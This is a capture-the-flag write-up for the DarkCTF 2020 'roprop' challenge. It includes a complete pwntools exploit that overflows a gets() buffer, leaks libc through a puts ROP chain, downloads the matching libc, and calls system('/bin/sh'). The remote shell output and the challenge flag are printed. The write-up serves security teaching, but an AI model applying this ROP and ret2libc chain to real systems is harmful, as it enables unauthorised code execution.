# DarkCTF 2020

## pwn/roprop

> 171 solves / 313 points
>
> Author: gr4n173
>
> This is from the back Solar Designer times where you require rope to climb and get anything you want.
>
> `nc pwn.darkarmy.xyz 5002`
> 
> [roprop](roprop)

Tags: _pwn_ _x86-64_ _remote-shell_ _rop_ _bof_


## Summary

`gets`.

> This is virtually the same as [_return-to-what_](https://github.com/datajerk/ctf-write-ups/tree/master/downunderctf2020/return_to_what).


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No shellcode, but that's about it.


### Decompile with Ghidra


```c
undefined8 main(void)
{
  char local_58 [80];
  
  nvm_init();
  nvm_timeout();
  puts("Welcome to the Solar Designer World.\n");
  puts("He have got something for you since late 19\'s.\n");
  gets(local_58);
  return 0;
}
```

`gets` vulnerability.  Easy ROP since no canary or PIE.  To get to the return address send `0x35` bytes (gotta love how Ghidra tells you that, i.e. `local_35`).


## Exploit

### Setup

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./roprop')
context.log_level = 'INFO'

if not args.REMOTE:
    context.log_file = 'local.log'
    libc = binary.libc
    p = process(binary.path)
else:
    context.log_file = 'remote.log'
    p = remote('roprop.darkarmy.xyz', 5002)
```

Boilerplate pwntools.  `context.binary` is important for ROP.  Also notice there's no `libc` set for `REMOTE` since we have to find it first.


### Leak libc

```python
rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

payload  = 0x58 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.main)

p.sendlineafter('He have got something for you since late 19\'s.\n\n',payload)

_ = p.recv(6)
puts = u64(_ + b'\0\0')
log.info('puts: ' + hex(puts))
```

Standard `puts` _putting_ itself out there.  With the `puts` location known we can find the version and base address of libc.  The last part of the payload jumps back to `vuln` for a second and final pass.


### Find libc

```python
if not 'libc' in locals():
    try:
        import requests
        r = requests.post('https://libc.rip/api/find', json = {'symbols':{'puts':hex(puts)[-3:]}})
        libc_url = r.json()[0]['download_url']
        libc_file = libc_url.split('/')[-1:][0]
        if not os.path.exists(libc_file):
            log.info('getting: ' + libc_url)
            r = requests.get(libc_url, allow_redirects=True)
            open(libc_file,'wb').write(r.content)
    except:
        log.critical('get libc yourself!')
        sys.exit(0)
    libc = ELF(libc_file)

libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))
```

> Something new I'm experimenting with.

The `if` block will detect and download the correct libc. `libc_url = r.json()[0]['download_url']` needs to be changed if the downloaded libc does not work, just increment the `[0]` until you get the right one.


### Get a shell, get the flag

```python
payload  = 0x58 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(libc.search(b'/bin/sh').__next__())
payload += p64(libc.sym.system)

p.sendlineafter('He have got something for you since late 19\'s.\n\n',payload)
p.interactive()
```

Pop a shell, get the flag.

> `p64(pop_rdi + 1)` fixes a stack [alignment issue](https://blog.binpang.me/2019/07/12/stack-alignment/), see [blind-piloting](https://github.com/datajerk/ctf-write-ups/tree/master/b01lersctf2020/blind-piloting) for a lengthy example.

Output:

```
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/darkctf2020/roprop/roprop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to roprop.darkarmy.xyz on port 5002: Done
[*] Loaded 14 cached gadgets for './roprop'
[*] puts: 0x7f17891cda30
[*] getting: https://libc.rip/download/libc6_2.27-3ubuntu1.2_amd64.so
[*] '/pwd/datajerk/darkctf2020/roprop/libc6_2.27-3ubuntu1.2_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] libc.address: 0x7f178914d000
[*] Switching to interactive mode
$ ls -l
total 36
drwxr-x--- 1 0 1000 4096 Sep 25 02:12 bin
drwxr-x--- 1 0 1000 4096 Sep 25 02:12 dev
-rwxr----- 1 0 1000   29 Sep 19 11:19 flag.txt
drwxr-x--- 1 0 1000 4096 Sep 25 02:12 lib
drwxr-x--- 1 0 1000 4096 Sep 25 02:12 lib32
drwxr-x--- 1 0 1000 4096 Sep 25 02:12 lib64
-rwxr-x--- 1 0 1000 8872 Sep 21 17:50 roprop
$ cat flag.txt
darkCTF{y0u_r0p_r0p_4nd_w0n}
```